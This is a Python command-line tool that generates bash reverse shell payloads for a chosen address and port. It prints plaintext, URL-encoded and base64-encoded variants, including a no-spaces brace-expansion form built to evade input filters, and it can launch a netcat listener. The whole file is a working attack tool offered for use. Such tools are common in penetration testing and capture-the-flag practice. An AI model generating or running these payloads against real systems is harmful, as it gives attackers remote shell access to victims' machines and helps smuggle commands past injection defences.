#!/usr/bin/env python3
import os
import sys
import getopt
import base64
from urllib.parse import quote

def main(argv):
   inputAddr = ''
   inputPort = '9001' # by default
   isRunNetcat = False
   helpStr = """Info:
   Simple generator reverse shell payload for bash

Usage:
   $ ./genRevShell.py [flags]

Flags:
   -a, --addr    Address for reverse connect
   -p, --port    Port for reverse connect, 9001 by default
   -r            Run the netcat on localhost

Example:
    $ ./genRevShell.py -a 127.0.0.1 -r
   """

   try:
      opts, args = getopt.getopt(argv,"hrna:p:",["addr=","port="])
   except getopt.GetoptError:
      print(helpStr)
      sys.exit(2)

   if not opts:
      print(helpStr)
      sys.exit()

   for opt, arg in opts:
      if (opt == '-h'):
         print(helpStr)
         sys.exit()
      elif (opt == '-r'):
         isRunNetcat = True
      elif opt in ('-a', '--addr'):
         inputAddr = arg
      elif opt in ('-p', '--port'):
         inputPort = int(arg)

   print(f'[*] Input address is {inputAddr}')
   print(f'[*] Input port is {inputPort}')

   bashPayload = f'bash  -c \'bash -i >& /dev/tcp/{inputAddr}/{inputPort} 0>&1\''

   print(f'\n\r[1] The bash payload in plaintext:\n\n\r{bashPayload}\n')
   print(f'[2] The bash payload in URL(plaintext):\n\n\r{quote(bashPayload, safe="")}\n')

   bashPayloadBytes = bashPayload.encode('ascii')
   base64Bytes = base64.b64encode(bashPayloadBytes)
   bashPayloadBase64 = base64Bytes.decode('ascii')

   bashPayloadBase64WithSpaces = f'echo {bashPayloadBase64}|base64 -d|bash -i'
   bashPayloadBase64NoSpaces = '{echo,' + bashPayloadBase64 + '}|{base64,-d}|{bash,-i}'

   print(f'[3] The bash payload in Base64():\n\n\r{bashPayloadBase64WithSpaces}\n')
   print(f'[4] The bash payload in URL(Base64()):\n\n\r{quote(bashPayloadBase64WithSpaces, safe="")}\n')

   print(f'[5] The bash payload in Base64() with no spaces:\n\n\r{bashPayloadBase64NoSpaces}\n')
   print(f'[6] The bash payload in URL(Base64()) with no spaces:\n\n\r{quote(bashPayloadBase64NoSpaces, safe="")}\n')

   if (isRunNetcat):
      print(f'[+] Run the netcat on localhost on {inputPort}:\n')
      os.system(f'nc -lvnp {inputPort}')

if __name__ == "__main__":
   main(sys.argv[1:])
